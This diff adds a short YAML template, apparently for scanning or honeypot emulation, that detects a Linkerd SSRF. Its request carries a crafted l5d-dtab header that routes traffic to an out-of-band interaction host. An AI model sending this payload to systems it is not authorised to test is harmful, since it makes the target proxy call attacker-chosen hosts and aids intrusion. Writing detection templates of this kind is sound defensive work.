@@ -1,0 +1,22 @@
+id: linkerd-ssrf-detection
+info:
+  name: Linkerd SSRF detection
+  author: dudez
+  description: Linkerd is vulnerable to SSRF.
+  severity: high
+  reference:
+  - https://twitter.com/nirvana_msu/status/1084144955034165248
+  metadata:
+    max-request: 1
+  tags: ssrf,linkerd,oast,misconfig
+traps:
+- request:
+    method: GET
+    path: ''
+    headers:
+      l5d-dtab: /svc/* => /$/inet/{{interactsh-url}}/443
+    body: null
+  response:
+    status_code: 200
+    headers: {}
+    body: ''
